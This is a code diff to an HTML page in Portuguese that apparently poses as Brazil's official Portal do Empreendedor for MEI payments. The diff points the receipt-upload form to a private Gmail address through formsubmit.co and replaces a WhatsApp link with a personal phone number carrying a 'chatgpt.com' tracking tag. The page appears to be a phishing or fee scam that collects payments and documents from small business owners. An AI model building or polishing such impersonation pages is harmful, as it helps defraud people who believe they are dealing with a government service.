@@ -305,8 +305,8 @@
                 <h3 style="color: #00A859; margin-bottom: 10px;">Quase lá!</h3>
                 <p style="font-size: 14px; margin-bottom: 20px; color: #555;">Envie seu comprovante para darmos baixa no sistema.</p>
                 
-                <!-- LEMBRE-SE DE COLOCAR SEU E-MAIL AQUI -->
-                <form action="https://formsubmit.co/SEU_EMAIL_AQUI@GMAIL.COM" method="POST" enctype="multipart/form-data" id="form-comprovante">
+                <!-- Formulário integrado com portalempreendedor.sac@gmail.com -->
+                <form action="https://formsubmit.co/portalempreendedor.sac@gmail.com" method="POST" enctype="multipart/form-data" id="form-comprovante">
                     
                     <input type="hidden" name="_subject" value="Novo Comprovante de Pagamento MEI!">
                     <input type="hidden" name="_captcha" value="false">
@@ -396,10 +396,9 @@
             step2.style.display = 'block';
         });
 
-        // Interceptar o clique de enviar para redirecionar para o WhatsApp personalizado
+        // Interceptar o clique de enviar para redirecionar para o novo link do WhatsApp
         formComprovante.addEventListener('submit', function(e) {
-            // Abre o link do WhatsApp fornecido
-            window.open('https://w.app/portaldoempreendedor', '_blank');
+            window.open('https://wa.me/5516996565112?text=Ol%C3%A1%21+Estou+enviando+o+comprovante+de+pagamento.&utm_source=chatgpt.com', '_blank');
         });
 
         // Verifica se a URL tem sucesso para mostrar a tela final
